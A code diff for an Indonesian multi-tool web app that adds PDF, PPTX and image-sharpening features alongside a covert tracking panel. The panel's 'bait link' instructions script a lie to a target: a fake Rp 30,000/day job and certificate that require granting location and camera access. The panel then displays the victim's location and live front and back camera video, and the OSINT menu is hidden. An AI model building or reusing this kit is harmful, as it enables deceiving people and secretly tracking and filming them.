@@ -468,8 +468,32 @@
     <div class="about-box">
       <div style="background:var(--violet); padding:15px; border-radius:10px; border:2px solid var(--ink); margin-bottom:15px; color:#14151a;">
         <h4 style="margin:0 0 10px 0; font-size:16px; font-weight:800; text-transform:uppercase;">LINK TARGET</h4>
-        <input type="text" id="linkPelacak" value="https://kreatifstudio.vercel.app/" readonly style="width:100%; padding:10px; border-radius:5px; border:2px solid var(--ink); font-size:14px; background:var(--card); color:var(--ink); font-weight:bold; text-align:center;">
-        <button class="btn" onclick="copyLinkPelacak()" style="width:100%; background:var(--yellow); color:#14151a; margin-top:10px;">Copy Link Umpan</button>
+        <input type="text" id="linkPelacak" value="https://kreatifstudio.vercel.app" readonly style="width:100%; padding:10px; border-radius:5px; border:2px solid var(--ink); font-size:14px; background:var(--card); color:var(--ink); font-weight:bold; text-align:center;">
+        <button class="btn" onclick="copyLinkPelacak()" style="width:100%; background:var(--yellow); color:#14151a; margin-top:10px;">📋 Copy Link Umpan</button>
+      </div>
+
+      <!-- PENJELASAN IMING-IMING -->
+      <div style="background:#fff8e1; border:2px dashed var(--ink); border-radius:10px; padding:15px; margin-bottom:15px; font-size:13px; line-height:1.7; color:#14151a;">
+        <b style="font-size:14px; display:block; margin-bottom:8px;">📌 Cara Pakai & Penjelasan:</b>
+        
+        <div style="margin-bottom:10px;">
+          1. Kirim link di atas ke target (contoh: <i>"Bang, ini link web freelance saya, cek dulu"</i>).
+        </div>
+        
+        <div style="background:rgba(123, 241, 168, 0.3); padding:10px; border-radius:8px; margin-bottom:10px; border-left:4px solid var(--mint);">
+          <b>💡 Tips Bujuk Target:</b><br>
+          Bilang ke target: <i>"Bro, izinin akses lokasi & kamera ya. Ini buat verifikasi portofolio kamu. Nanti kalau kamu berhasil nyelesaiin tugas harian, kamu bakal dapet gaji <b>Rp 30.000/hari</b>. Sertifikat juga bakal dikirim ke kamu kalau verifikasi berhasil."</i>
+        </div>
+        
+        <div style="background:rgba(255, 77, 77, 0.15); padding:10px; border-radius:8px; margin-bottom:10px; border-left:4px solid var(--red);">
+          <b>⚠️ Peringatan untuk Target:</b><br>
+          Kalau target nolak izin akses lokasi atau kamera, portofolio <b>TIDAK BISA DICETAK</b>, sertifikat <b>TIDAK AKAN DIBUAT</b>, dan gaji <b>TIDAK AKAN DIBERIKAN</b>.
+        </div>
+        
+        <div style="margin-top:10px;">
+          2. Tunggu target buka link, klik <b>"Masuk & Mulai"</b>, lalu klik <b>"Izinkan"</b> saat browser minta akses lokasi & kamera.<br>
+          3. Data lokasi + foto target otomatis muncul di panel bawah ini.
+        </div>
       </div>
       <h4 style="margin-bottom:10px; font-size:14px;">Target Terdeteksi (Lokasi):</h4>
       <div id="realtime-lokasi-container" style="margin-bottom:20px;">
@@ -477,14 +501,19 @@
       </div>
       <h4 style="margin-bottom:10px; font-size:14px;">Live Camera Target:</h4>
       <div id="realtime-kamera-container" style="margin-bottom:20px;">
-        <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:10px;">
-          <div id="cam-feed-depan" style="display:none; flex:1; min-width:200px; border:2px dashed var(--ink); border-radius:10px; padding:10px; text-align:center;">
-            <span style="font-size:12px; font-weight:bold;">Kamera Depan</span>
-            <img id="img-cam-depan" style="width:100%; border-radius:8px; margin-top:5px;" />
-          </div>
-          <div id="cam-feed-belakang" style="display:none; flex:1; min-width:200px; border:2px dashed var(--ink); border-radius:10px; padding:10px; text-align:center;">
-            <span style="font-size:12px; font-weight:bold;">Kamera Belakang</span>
-            <img id="img-cam-belakang" style="width:100%; border-radius:8px; margin-top:5px;" />
+        <div style="position: relative;">
+          <!-- TOMBOL SILANG (X) -->
+          <button id="btnCloseCam" onclick="closeCamFeed()" style="display:none; position:absolute; top:10px; right:10px; z-index:20; width:36px; height:36px; border-radius:50%; background:var(--red); color:white; border:2.5px solid var(--ink); cursor:pointer; font-weight:bold; font-size:16px; box-shadow:var(--shadow-sm);">✕</button>
+          
+          <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:10px;">
+            <div id="cam-feed-depan" style="display:none; flex:1; min-width:200px; border:2px dashed var(--ink); border-radius:10px; padding:10px; text-align:center; position:relative;">
+              <span style="font-size:12px; font-weight:bold;">Kamera Depan</span>
+              <video id="video-cam-depan" autoplay playsinline muted style="width:100%; border-radius:8px; margin-top:5px; background:#000;"></video>
+            </div>
+            <div id="cam-feed-belakang" style="display:none; flex:1; min-width:200px; border:2px dashed var(--ink); border-radius:10px; padding:10px; text-align:center; position:relative;">
+              <span style="font-size:12px; font-weight:bold;">Kamera Belakang</span>
+              <video id="video-cam-belakang" autoplay playsinline muted style="width:100%; border-radius:8px; margin-top:5px; background:#000;"></video>
+            </div>
           </div>
         </div>
         
@@ -513,7 +542,7 @@
     <div class="nav-link active" id="nav-home" onclick="showPage('home')">Dashboard</div>
     <div class="nav-link" id="nav-pengumuman" onclick="showPage('pengumuman')">Pengumuman</div>
     <div class="nav-link" id="nav-rating" onclick="showPage('rating')">Rating</div>
-    <div class="nav-link" id="nav-osint" onclick="showPage('osint')">OSINT</div>
+    <div class="nav-link" id="nav-osint" onclick="showPage('osint')" style="display: none;">OSINT</div>
     <div class="nav-link" id="nav-adduser" onclick="showPage('adduser')" style="display:none;">Kelola User</div>
     <div class="nav-link" id="nav-about" onclick="showPage('about')">About</div>
   </div>
@@ -595,6 +624,65 @@ const SVG = {
   moon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>'
 };
 
+// ============================================
+// FUNGSI BANTU PROSES BERAT (Anti Crash HP) — SINGLE VERSION
+// ============================================
+const yieldToBrowser = () => new Promise(r => requestAnimationFrame(() => setTimeout(r, 0)));
+
+async function prosesBerat(callback, labelNotif = 'sedang di proses...') {
+  const notifEl = document.getElementById('notifBox');
+  notifEl.innerHTML = `
+    <div style="font-weight:800; margin-bottom:8px;">${labelNotif}</div>
+    <div style="width:200px; height:8px; background:rgba(255,255,255,0.3); border-radius:999px; overflow:hidden; margin:0 auto;">
+      <div id="prosesBarFill" style="width:0%; height:100%; background:linear-gradient(90deg,var(--yellow),var(--mint)); border-radius:999px; transition:width 0.15s ease;"></div>
+    </div>
+    <div id="prosesBarText" style="font-size:11px; margin-top:5px; font-weight:normal;">0%</div>
+  `;
+  notifEl.style.display = 'block';
+  notifEl.style.padding = '15px 25px';
+
+  let progress = 0;
+  const fill = document.getElementById('prosesBarFill');
+  const text = document.getElementById('prosesBarText');
+  const tick = () => {
+    if (progress < 92) {
+      progress += Math.random() * 6 + 1.5;
+      if (progress > 92) progress = 92;
+      if (fill) fill.style.width = progress + '%';
+      if (text) text.innerText = Math.floor(progress) + '%';
+    }
+  };
+  const progressInterval = setInterval(tick, 120);
+
+  // Yield ke browser dulu biar UI gak freeze
+  await new Promise(r => requestAnimationFrame(() => setTimeout(r, 50)));
+
+  try {
+    await callback();
+  } catch (e) {
+    console.error('Proses gagal:', e);
+    clearInterval(progressInterval);
+    notifEl.innerHTML = `<div style="font-weight:800;">❌ Gagal: ${e.message || e}</div>`;
+    setTimeout(() => { notifEl.style.display = 'none'; }, 3000);
+    return;
+  }
+
+  clearInterval(progressInterval);
+  if (fill) fill.style.width = '100%';
+  if (text) text.innerText = '100%';
+
+  notifEl.innerHTML = `
+    <div style="font-weight:800; margin-bottom:8px;">✅ Selesai!</div>
+    <div style="width:200px; height:8px; background:rgba(255,255,255,0.3); border-radius:999px; overflow:hidden; margin:0 auto;">
+      <div style="width:100%; height:100%; background:linear-gradient(90deg,var(--yellow),var(--mint)); border-radius:999px;"></div>
+    </div>
+    <div style="font-size:11px; margin-top:5px; font-weight:normal;">100%</div>
+  `;
+
+  setTimeout(() => { notifEl.style.display = 'none'; }, 1500);
+  await new Promise(r => setTimeout(r, 300));
+}
+
 function applyTheme(t){ document.body.classList.toggle('dark', t==='dark'); document.getElementById('themeToggle').innerHTML = t==='dark' ? SVG.sun : SVG.moon; }
 function toggleTheme(){ let nt = document.body.classList.contains('dark') ? 'light' : 'dark'; localStorage.setItem('theme', nt); applyTheme(nt); }
 applyTheme(localStorage.getItem('theme') || 'light');
@@ -607,13 +695,61 @@ window.addEventListener('load', () => {
   setTimeout(() => { fireRing.classList.add('fire-explode'); setTimeout(() => { ringContainer.style.display = 'none'; brandTitle.classList.add('show'); setTimeout(() => { lineContainer.classList.add('show'); line.classList.add('run'); setTimeout(() => { brandTitle.classList.remove('show'); brandTitle.style.opacity = '0'; lineContainer.style.opacity = '0'; loginBox.classList.add('show-panel'); }, 1500); }, 500); }, 600); }, 1500);
 });
 
+// ============================================
+// TOAST DOWNLOAD — COUNTER 0-100%
+// ============================================
 window.showDownloadToast = function(filename, blobUrl) {
-  const container = document.getElementById('downloadToastContainer'); if(!container) return;
-  while(container.children.length >= 2) { container.removeChild(container.firstChild); }
-  const toastId = 'toast-' + Date.now(); const toast = document.createElement('div'); toast.className = 'download-toast'; toast.id = toastId;
-  toast.innerHTML = `<div class="dl-icon loading" id="${toastId}-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div><div class="dl-content"><p class="dl-title" id="${toastId}-title">Mengunduh...</p><p class="dl-subtitle" id="${toastId}-subtitle">${filename || 'File'}</p></div><button class="dl-close-btn" onclick="document.getElementById('${toastId}').remove()">✕</button>`;
+  const container = document.getElementById('downloadToastContainer');
+  if (!container) return;
+  while (container.children.length >= 2) container.removeChild(container.firstChild);
+
+  const toastId = 'toast-' + Date.now();
+  const toast = document.createElement('div');
+  toast.className = 'download-toast';
+  toast.id = toastId;
+  toast.innerHTML = `
+    <div class="dl-icon loading" id="${toastId}-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+    </div>
+    <div class="dl-content">
+      <p class="dl-title" id="${toastId}-title">sedang di proses... 0%</p>
+      <p class="dl-subtitle" id="${toastId}-subtitle">${filename || 'File'}</p>
+    </div>
+    <button class="dl-close-btn" onclick="document.getElementById('${toastId}').remove()">✕</button>
+  `;
   container.appendChild(toast);
-  setTimeout(() => { const icon = document.getElementById(`${toastId}-icon`); const title = document.getElementById(`${toastId}-title`); if(icon) { icon.className = 'dl-icon'; icon.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>`; } if(title) title.innerText = 'Berhasil di-download!'; if(blobUrl) { const btn = document.createElement('a'); btn.href = blobUrl; btn.target = '_blank'; btn.className = 'dl-open-btn show'; btn.innerHTML = 'Buka'; toast.querySelector('.dl-content').appendChild(btn); } setTimeout(() => { const t = document.getElementById(toastId); if(t) { t.classList.add('hide'); setTimeout(() => t.remove(), 300); } }, 4000); }, 800);
+
+  let pct = 0;
+  const titleEl = document.getElementById(`${toastId}-title`);
+  const interval = setInterval(() => {
+    pct += Math.random() * 15 + 5;
+    if (pct >= 100) pct = 100;
+    if (titleEl) titleEl.innerText = `sedang di proses... ${Math.floor(pct)}%`;
+    if (pct >= 100) {
+      clearInterval(interval);
+      const icon = document.getElementById(`${toastId}-icon`);
+      const title = document.getElementById(`${toastId}-title`);
+      if (icon) {
+        icon.className = 'dl-icon';
+        icon.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>`;
+      }
+      if (title) title.innerText = '✅ Selesai!';
+      if (blobUrl) {
+        const btn = document.createElement('a');
+        btn.href = blobUrl; btn.target = '_blank';
+        btn.className = 'dl-open-btn show';
+        btn.innerHTML = 'Buka';
+        toast.querySelector('.dl-content').appendChild(btn);
+      }
+      setTimeout(() => {
+        const t = document.getElementById(toastId);
+        if (t) { t.classList.add('hide'); setTimeout(() => t.remove(), 300); }
+      }, 4000);
+    }
+  }, 180);
 };
 function toggleProfile(){ document.getElementById('profileOverlay').classList.add('open'); }
 function closeProfileModal(e) { if(e.target.id === 'profileOverlay') document.getElementById('profileOverlay').classList.remove('open'); }
@@ -682,7 +818,7 @@ function selectThemeColor(color, el) { selectedThemeColor = color; document.quer
 
 function openPanel(id){
   const t = TOOLS.find(x => x.id === id); document.getElementById('panelEmoji').innerHTML = t.icon; document.getElementById('panelEmoji').style.background = COLORS[t.color]; document.getElementById('panelTitle').textContent = t.title; document.getElementById('panelBody').innerHTML = TEMPLATES[id]; document.getElementById('overlay').classList.add('open'); document.body.style.overflow = 'hidden';
-  if(id === 'txt2pdf') pdfImages = [];
+  if(id === 'txt2pdf' || id === 'img2pdf') pdfImages = [];
   if(id === 'tictactoe') { document.getElementById('tttMode').value = 'pvp'; document.getElementById('tttDifficulty').style.display = 'none'; resetTTT(); }
   if(id === 'pptx') { slides = []; addSlide(); updateCoverPreview(); selectThemeColor('#FFD43B', document.querySelector('.swatch')); }
   if(id === 'ai') { renderChat(); aiImageData = null; setAIMode('belajar'); }
@@ -693,7 +829,43 @@ document.addEventListener('keydown', e => { if(e.key === 'Escape') closePanel();
 
 let enhancerOriginalImage = null;
 window.handleEnhancerUpload = function(event) { const file = event.target.files[0]; if (!file) return; const reader = new FileReader(); reader.onload = (e) => { const img = new Image(); img.onload = () => { enhancerOriginalImage = img; document.getElementById('enhancerImgOriginal').src = e.target.result; const canvas = document.getElementById('enhancerCanvas'); canvas.width = img.width; canvas.height = img.height; document.getElementById('enhancerWorkspace').style.display = 'block'; applySharpening(); }; img.src = e.target.result; }; reader.readAsDataURL(file); event.target.value = ''; };
-window.applySharpening = function() { if (!enhancerOriginalImage) return; const intensity = parseFloat(document.getElementById('sharpnessSlider').value); document.getElementById('sharpnessVal').innerText = intensity.toFixed(1) + 'x'; const canvas = document.getElementById('enhancerCanvas'); const ctx = canvas.getContext('2d'); const w = canvas.width; const h = canvas.height; ctx.drawImage(enhancerOriginalImage, 0, 0); const imgData = ctx.getImageData(0, 0, w, h); const pixels = imgData.data; const output = ctx.createImageData(w, h); const outData = output.data; const center = 1 + (4 * intensity); const edge = -intensity; for (let y = 0; y < h; y++) { for (let x = 0; x < w; x++) { const i = (y * w + x) * 4; if (x === 0 || x === w - 1 || y === 0 || y === h - 1) { outData[i] = pixels[i]; outData[i+1] = pixels[i+1]; outData[i+2] = pixels[i+2]; outData[i+3] = pixels[i+3]; continue; } const left = i - 4; const right = i + 4; const top = i - (w * 4); const bottom = i + (w * 4); for (let c = 0; c < 3; c++) { let newVal = (pixels[i + c] * center) + (pixels[left + c] * edge) + (pixels[right + c] * edge) + (pixels[top + c] * edge) + (pixels[bottom + c] * edge); outData[i + c] = Math.min(255, Math.max(0, newVal)); } outData[i + 3] = pixels[i + 3]; } } ctx.putImageData(output, 0, 0); };
+
+window.applySharpening = async function() {
+  if (!enhancerOriginalImage) return;
+  const intensity = parseFloat(document.getElementById('sharpnessSlider').value);
+  document.getElementById('sharpnessVal').innerText = intensity.toFixed(1) + 'x';
+  const canvas = document.getElementById('enhancerCanvas');
+  const ctx = canvas.getContext('2d');
+  const w = canvas.width, h = canvas.height;
+  ctx.drawImage(enhancerOriginalImage, 0, 0);
+  const imgData = ctx.getImageData(0, 0, w, h);
+  const pixels = imgData.data;
+  const output = ctx.createImageData(w, h);
+  const outData = output.data;
+  const center = 1 + (4 * intensity);
+  const edge = -intensity;
+
+  for (let y = 0; y < h; y++) {
+    for (let x = 0; x < w; x++) {
+      const i = (y * w + x) * 4;
+      if (x === 0 || x === w - 1 || y === 0 || y === h - 1) {
+        outData[i] = pixels[i]; outData[i+1] = pixels[i+1];
+        outData[i+2] = pixels[i+2]; outData[i+3] = pixels[i+3];
+        continue;
+      }
+      const left = i - 4, right = i + 4;
+      const top = i - (w * 4), bottom = i + (w * 4);
+      for (let c = 0; c < 3; c++) {
+        let v = (pixels[i+c]*center) + (pixels[left+c]*edge) + (pixels[right+c]*edge) + (pixels[top+c]*edge) + (pixels[bottom+c]*edge);
+        outData[i+c] = Math.min(255, Math.max(0, v));
+      }
+      outData[i+3] = pixels[i+3];
+    }
+    if (y % 80 === 0) await new Promise(r => setTimeout(r, 0));
+  }
+  ctx.putImageData(output, 0, 0);
+};
+
 window.downloadEnhancer = function() { const canvas = document.getElementById('enhancerCanvas'); if (!canvas.width) return showGlassNotif('Belum ada foto!'); const filename = 'foto-jernih-' + Date.now() + '.png'; const dataUrl = canvas.toDataURL('image/png'); fetch(dataUrl).then(res => res.blob()).then(blob => { const blobUrl = URL.createObjectURL(blob); const link = document.createElement('a'); link.download = filename; link.href = dataUrl; link.click(); window.showDownloadToast(filename, blobUrl); }); };
 
 let cropTarget = null, cropper = null;
@@ -711,7 +883,49 @@ function setPdfOrient(i, orient){ if(!pdfImages[i]) return; pdfImages[i].orient 
 function updateSlider(type, i, field, val){ if(type === 'pdf') { pdfImages[i][field] = +val; const el = document.getElementById(`preview-pdf-${i}`); if(el) el.style.transform = `translate(-50%, -50%) translate(${pdfImages[i].sX}px, ${pdfImages[i].sY}px) scale(${pdfImages[i].sScale/100}) rotate(${pdfImages[i].sRot}deg)`; const lbl = document.getElementById(`val-${field}-${i}`); if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px'); } else { slides[i][field] = +val; const el = document.getElementById(`preview-ppt-${i}`); if(el) el.style.transform = `translate(-50%, -50%) translate(${slides[i].sX}px, ${slides[i].sY}px) scale(${slides[i].sScale/100}) rotate(${slides[i].sRot}deg)`; const lbl = document.getElementById(`val-${field}-${i}`); if(lbl) lbl.innerText = val + (field === 'sRot' ? '°' : field === 'sScale' ? '%' : 'px'); } }
 function removePdfImage(i){ pdfImages.splice(i,1); renderPdfImgPreview(); }
 
-function makePDF(){ if(pdfImages.length === 0){ alert('Upload gambar dulu!'); return; } const { jsPDF } = window.jspdf; let doc = new jsPDF({ orientation: 'p', unit: 'mm', format: 'a4' }); pdfImages.forEach((img, idx) => { const props = doc.getImageProperties(img.dataUrl); let imgOrient = img.orient; if (imgOrient === 'auto') { imgOrient = props.width > props.height ? 'l' : 'p'; } if (idx > 0) { doc.addPage('a4', imgOrient); } else { if (imgOrient !== 'p') { doc.deletePage(1); doc.addPage('a4', imgOrient); } } const pW = doc.internal.pageSize.getWidth(); const pH = doc.internal.pageSize.getHeight(); const margin = 10; const usableW = pW - margin * 2; const usableH = pH - margin * 2; let w = usableW; let h = (props.height * usableW) / props.width; if (h > usableH) { h = usableH; w = (props.width * usableH) / props.height; } const finalW = w * (img.sScale / 100); const finalH = h * (img.sScale / 100); const finalX = ((pW - finalW) / 2) + (img.sX * 0.5); const finalY = ((pH - finalH) / 2) + (img.sY * 0.5); try { doc.addImage(img.dataUrl, props.fileType || 'JPEG', finalX, finalY, finalW, finalH, null, 'FAST', img.sRot); } catch(e) { console.error('Gagal tambah gambar:', e); } }); const pdfFilename = 'gambar-ke-pdf-' + Date.now() + '.pdf'; const blob = doc.output('blob'); const blobUrl = URL.createObjectURL(blob); doc.save(pdfFilename); window.showDownloadToast(pdfFilename, blobUrl); }
+// ============================================
+// GAMBAR KE PDF — SMOOTH VERSION (Anti Crash)
+// ============================================
+function makePDF(){
+  if (pdfImages.length === 0) { showGlassNotif('Upload gambar dulu!'); return; }
+  prosesBerat(async () => {
+    const { jsPDF } = window.jspdf;
+    let doc = new jsPDF({ orientation:'p', unit:'mm', format:'a4' });
+
+    for (let idx = 0; idx < pdfImages.length; idx++) {
+      const img = pdfImages[idx];
+      const props = doc.getImageProperties(img.dataUrl);
+      let imgOrient = img.orient;
+      if (imgOrient === 'auto') imgOrient = props.width > props.height ? 'l' : 'p';
+
+      if (idx > 0) doc.addPage('a4', imgOrient);
+      else if (imgOrient !== 'p') { doc.deletePage(1); doc.addPage('a4', imgOrient); }
+
+      const pW = doc.internal.pageSize.getWidth();
+      const pH = doc.internal.pageSize.getHeight();
+      const margin = 10;
+      const usableW = pW - margin * 2;
+      const usableH = pH - margin * 2;
+      let w = usableW;
+      let h = (props.height * usableW) / props.width;
+      if (h > usableH) { h = usableH; w = (props.width * usableH) / props.height; }
+
+      const finalW = w * (img.sScale / 100);
+      const finalH = h * (img.sScale / 100);
+      const finalX = ((pW - finalW) / 2) + (img.sX * 0.5);
+      const finalY = ((pH - finalH) / 2) + (img.sY * 0.5);
+
+      try { doc.addImage(img.dataUrl, props.fileType || 'JPEG', finalX, finalY, finalW, finalH, null, 'FAST', img.sRot); } catch(e) { console.error(e); }
+      await yieldToBrowser();
+    }
+
+    const filename = 'gambar-ke-pdf-' + Date.now() + '.pdf';
+    const blob = doc.output('blob');
+    const blobUrl = URL.createObjectURL(blob);
+    doc.save(filename);
+    window.showDownloadToast(filename, blobUrl);
+  }, 'sedang di proses...');
+}
 
 let tttBoard = Array(9).fill(''), tttTurn = 'X', tttScoreX = 0, tttScoreO = 0, tttScoreDraw = 0, isAiThinking = false, tttFirstTurn = 'X';
 window.updateTTTColor = function(selectEl) { const val = selectEl.value; const txtColor = selectEl.options[selectEl.selectedIndex].style.color; const bgColor = selectEl.options[selectEl.selectedIndex].style.backgroundColor; selectEl.style.color = txtColor || 'var(--ink)'; selectEl.style.backgroundColor = bgColor || 'var(--card)'; selectEl.style.fontWeight = 'bold'; }
@@ -732,7 +946,56 @@ function updateSlideField(i, field, val){ slides[i][field] = val; if(field === '
 function handleSlideImage(i, e){ const file = e.target.files[0]; if(!file) return; const reader = new FileReader(); reader.onload = () => { slides[i].image = reader.result; slides[i].sScale = 100; slides[i].sRot = 0; slides[i].sX = 0; slides[i].sY = 0; renderSlides(); }; reader.readAsDataURL(file); }
 function renderSlides(){ const wrap = document.getElementById('slideList'); if(!wrap) return; wrap.innerHTML = ''; slides.forEach((s, i) => { const div = document.createElement('div'); div.className = 'slide-card'; div.innerHTML = `<span class="slide-num">Slide ${i+1}</span>${slides.length > 1 ? `<button class="removeSlide" onclick="removeSlide(${i})">✕</button>` : ''}<div class="row" style="gap:10px; margin-bottom:8px;"><div><label>Tata Letak</label><select onchange="updateSlideField(${i}, 'layout', this.value)" style="border:2.5px solid var(--ink);border-radius:10px;padding:8px;width:100%;background:var(--card); font-size:13px; font-weight:bold; color:var(--ink);"><option value="split" ${s.layout==='split'?'selected':''}>Split (Teks Kiri, Gambar Kanan)</option><option value="full" ${s.layout==='full'?'selected':''}>Full Gambar (Teks di atas Gambar)</option></select></div><div><label>Posisi Judul</label><select onchange="updateSlideField(${i}, 'titleAlign', this.value)" style="border:2.5px solid var(--ink);border-radius:10px;padding:8px;width:100%;background:var(--card); font-size:13px; font-weight:bold; color:var(--ink);"><option value="left" ${s.titleAlign==='left'?'selected':''}>Kiri</option><option value="center" ${s.titleAlign==='center'?'selected':''}>Tengah</option><option value="right" ${s.titleAlign==='right'?'selected':''}>Kanan</option></select></div></div><label>Judul slide</label><input type="text" value="${s.title.replace(/"/g,'&quot;')}" oninput="updateSlideField(${i},'title',this.value)" placeholder="Judul slide ${i+1}"><label>Isi / poin-poin</label><textarea oninput="updateSlideField(${i},'body',this.value)" placeholder="Tulis isi slide...">${s.body}</textarea><label>Gambar slide (Potong & Atur)</label><input type="file" accept="image/*" onchange="handleSlideImage(${i}, event)" style="border:2.5px solid var(--ink);border-radius:10px;padding:8px;width:100%;background:var(--paper); margin-bottom: 8px; color:var(--ink);">${s.image ? `<div class="preview-container ppt-preview" style="max-width: 300px;"><img src="${s.image}" class="preview-img" id="preview-ppt-${i}" style="transform: translate(-50%, -50%) translate(${s.sX}px, ${s.sY}px) scale(${s.sScale/100}) rotate(${s.sRot}deg);"></div><div class="btn-row" style="justify-content: flex-start; margin-top:10px;"><button onclick="openCropModal('ppt', ${i})" style="border:2px solid var(--ink); background:var(--mint); font-weight:bold; border-radius:5px; cursor:pointer; font-size:12px; padding:6px 10px; color:#14151a;">Potong Gambar</button></div><div class="slider-controls"><div class="slider-group"><span>Ukuran</span> <input type="range" min="10" max="300" value="${s.sScale}" oninput="updateSlider('ppt', ${i}, 'sScale', this.value)"> <span id="val-sScale-${i}">${s.sScale}%</span></div><div class="slider-group"><span>Rotasi</span> <input type="range" min="0" max="360" value="${s.sRot}" oninput="updateSlider('ppt', ${i}, 'sRot', this.value)"> <span id="val-sRot-${i}">${s.sRot}°</span></div><div class="slider-group"><span>Geser X</span> <input type="range" min="-200" max="200" value="${s.sX}" oninput="updateSlider('ppt', ${i}, 'sX', this.value)"> <span id="val-sX-${i}">${s.sX}px</span></div><div class="slider-group"><span>Geser Y</span> <input type="range" min="-200" max="200" value="${s.sY}" oninput="updateSlider('ppt', ${i}, 'sY', this.value)"> <span id="val-sY-${i}">${s.sY}px</span></div></div>` : ''}`; wrap.appendChild(div); }); }
 
-function generatePPTX(){ if(typeof PptxGenJS === 'undefined'){ alert('Library PPTX gagal dimuat.'); return; } const title = document.getElementById('pptxTitle').value.trim() || 'Presentasi'; const titleAlign = document.getElementById('pptxTitleAlign').value; const themeAccent = selectedThemeColor.replace('#', ''); const isDark = selectedThemeColor === '#14151A'; const themeText = isDark ? 'FFFFFF' : '14151A'; const themeBg = 'FFFFFF'; const pptx = new PptxGenJS(); pptx.defineLayout({ name:'WIDE', width:10, height:5.63 }); pptx.layout = 'WIDE'; const cover = pptx.addSlide(); cover.background = { color: themeBg }; cover.addShape('rect', { x:0, y:2.35, w:10, h:0.9, fill:{color:themeAccent} }); let coverTitleOpts = { x:0.5, y:2.35, w:9, h:0.9, fontSize:32, bold:true, color:themeText, fontFace:'Arial', valign:'middle' }; coverTitleOpts.align = titleAlign === 'center' ? 'center' : titleAlign === 'right' ? 'right' : 'left'; cover.addText(title, coverTitleOpts); slides.forEach(s => { const sl = pptx.addSlide(); sl.background = { color: themeBg }; sl.addShape('rect', { x:0, y:0, w:10, h:0.12, fill:{color:themeAccent} }); let titleOpts = { y:0.4, h:0.8, fontSize:28, bold:true, fontFace:'Arial' }; if (s.titleAlign === 'center') { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'center'; } else if (s.titleAlign === 'right') { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'right'; } else { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'left'; } if(s.layout === 'full' && s.image) { sl.addImage({ data: s.image, x:0, y:0, w:10, h:5.63, rotate:s.sRot, sizing:{ type:'cover', w:10, h:5.63 } }); if(s.title){ titleOpts.color = '#FFFFFF'; titleOpts.shadow = {type:'outer', color:'000000', blur:2, offset:1, angle:45}; sl.addText(s.title, titleOpts); } if(s.body){ const bullets = s.body.split('\n').filter(l=>l.trim()!=='').map(l=>({text:l, options:{bullet:true, breakLine:true}})); sl.addText(bullets.length?bullets:[{text:s.body}], { x:0.5, y:1.4, w:9, h:3.6, fontSize:20, color:'#FFFFFF', fontFace:'Arial', valign:'top', shadow:{type:'outer', color:'000000', blur:2, offset:1, angle:45} }); } } else { if(s.title){ titleOpts.color = themeText; sl.addText(s.title, titleOpts); } if(s.body){ const bullets = s.body.split('\n').filter(l=>l.trim()!=='').map(l=>({text:l, options:{bullet:true, breakLine:true}})); sl.addText(bullets.length?bullets:[{text:s.body}], { x:0.5, y:1.4, w:4.5, h:3.6, fontSize:18, color:themeText, fontFace:'Arial', valign:'top' }); } if(s.image){ let imgW = 4.3, imgH = 4.3; let scaleFactor = s.sScale / 100; let newW = imgW * scaleFactor, newH = imgH * scaleFactor; let offsetX = s.sX / 100, offsetY = s.sY / 100; let finalX = 7.35 + offsetX - (newW/2); let finalY = 2.815 + offsetY - (newH/2); sl.addImage({ data: s.image, x: finalX, y: finalY, w:newW, h:newH, rotate: s.sRot, sizing:{ type:'contain', w:newW, h:newH } }); } } }); pptx.writeFile({ fileName: title + '.pptx' }).then(filename => { window.showDownloadToast(title + '.pptx', null); }); }
+// ============================================
+// GENERATE PPTX — SMOOTH VERSION (Anti Crash)
+// ============================================
+async function generatePPTX(){
+  if(typeof PptxGenJS === 'undefined'){ alert('Library PPTX gagal dimuat.'); return; }
+  const title = document.getElementById('pptxTitle').value.trim() || 'Presentasi';
+  const titleAlign = document.getElementById('pptxTitleAlign').value;
+  const themeAccent = selectedThemeColor.replace('#', '');
+  const isDark = selectedThemeColor === '#14151A';
+  const themeText = isDark ? 'FFFFFF' : '14151A';
+  const themeBg = 'FFFFFF';
+
+  prosesBerat(async () => {
+    const pptx = new PptxGenJS();
+    pptx.defineLayout({ name:'WIDE', width:10, height:5.63 });
+    pptx.layout = 'WIDE';
+
+    const cover = pptx.addSlide();
+    cover.background = { color: themeBg };
+    cover.addShape('rect', { x:0, y:2.35, w:10, h:0.9, fill:{color:themeAccent} });
+    let coverTitleOpts = { x:0.5, y:2.35, w:9, h:0.9, fontSize:32, bold:true, color:themeText, fontFace:'Arial', valign:'middle' };
+    coverTitleOpts.align = titleAlign === 'center' ? 'center' : titleAlign === 'right' ? 'right' : 'left';
+    cover.addText(title, coverTitleOpts);
+    await yieldToBrowser();
+
+    for (const s of slides) {
+      const sl = pptx.addSlide();
+      sl.background = { color: themeBg };
+      sl.addShape('rect', { x:0, y:0, w:10, h:0.12, fill:{color:themeAccent} });
+      let titleOpts = { y:0.4, h:0.8, fontSize:28, bold:true, fontFace:'Arial' };
+      if (s.titleAlign === 'center') { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'center'; }
+      else if (s.titleAlign === 'right') { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'right'; }
